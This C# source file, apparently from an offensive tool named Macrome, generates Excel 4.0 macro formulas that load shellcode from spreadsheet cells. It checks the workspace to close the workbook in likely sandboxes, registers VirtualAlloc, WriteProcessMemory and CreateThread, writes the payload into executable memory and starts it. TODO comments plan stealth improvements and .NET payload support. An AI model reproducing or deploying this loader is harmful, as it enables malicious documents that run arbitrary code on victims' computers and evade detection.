using System;
using System.Collections.Generic;

namespace Macrome
{
    public static class MacroPatterns
    {
        public static List<String> GetBinaryLoaderPattern(string macroSheetName)
        {
            //TODO Autocalculate these values at generation time
            //These variables assume certain positions in generated macros
            //Col 1 is our obfuscated payload
            //Col 2 is our actual macro set defined below
            //Col 3 is a separated set of cells containing a binary payload, ends with the string END
            string lengthCounter = "R1C4";
            string offsetCounter = "R2C4";
            string dataCellRef = "R3C4";
            string dataCol = "C3";

            //Expects our invocation of VirtualAlloc to be on row 5, but this will change if the macro changes
            string baseMemoryAddress = "R5C2";

            //TODO [Stealth] Add VirtualProtect so we don't call VirtualAlloc with RWX permissions
            //TODO [Functionality] Apply x64 support changes from https://github.com/outflanknl/Scripts/blob/master/ShellcodeToJScript.js
            //TODO [Functionality] Add support for .NET payloads (https://docs.microsoft.com/en-us/dotnet/core/tutorials/netcore-hosting, https://www.mdsec.co.uk/2020/03/hiding-your-net-etw/)
            List<string> macros = new List<string>()
            {
                "=IF(GET.WORKSPACE(13)<770, CLOSE(FALSE),)",
                "=REGISTER(\"Kernel32\",\"VirtualAlloc\",\"JJJJJ\",\"VA\",,1,0)",
                "=REGISTER(\"Kernel32\",\"CreateThread\",\"JJJJJJJ\",\"CT\",,1,0)",
                "=REGISTER(\"Kernel32\",\"WriteProcessMemory\",\"JJJCJJ\",\"WPM\",,1,0)",
                "=VA(0,1000000,4096,64)", //Referenced by baseMemoryAddress
                string.Format("=SET.VALUE({0}!{1}, 0)", macroSheetName, lengthCounter),
                string.Format("=SET.VALUE({0}!{1},1)", macroSheetName, offsetCounter),
                string.Format("=FORMULA(\"={0}!R\"&{0}!{1}&\"{2}\",{0}!{3})", macroSheetName, offsetCounter, dataCol, dataCellRef),
                string.Format("=WHILE(GET.CELL(5,{0}!{1})<>\"END\")", macroSheetName, dataCellRef),
                string.Format("=WPM(-1,{0}!{1}+{0}!{2},{0}!{3},LEN({0}!{3}),0)", macroSheetName, baseMemoryAddress, lengthCounter, dataCellRef),
                string.Format("=SET.VALUE({0}!{1}, {0}!{1} + 1)", macroSheetName, offsetCounter),
                string.Format("=SET.VALUE({0}!{1}, {0}!{1} + LEN({0}!{2}))", macroSheetName, lengthCounter, dataCellRef),
                string.Format("=FORMULA(\"={0}!R\"&{0}!{1}&\"{2}\",{0}!{3})", macroSheetName, offsetCounter, dataCol, dataCellRef),
                "=NEXT()",
                //Execute our Payload
                string.Format("=CT(0,0,{0}!{1},0,0,0)", macroSheetName, baseMemoryAddress),
                "=WAIT(NOW()+\"00:00:03\")",
                "=HALT()"
            };

            return macros;
        }
    }
}
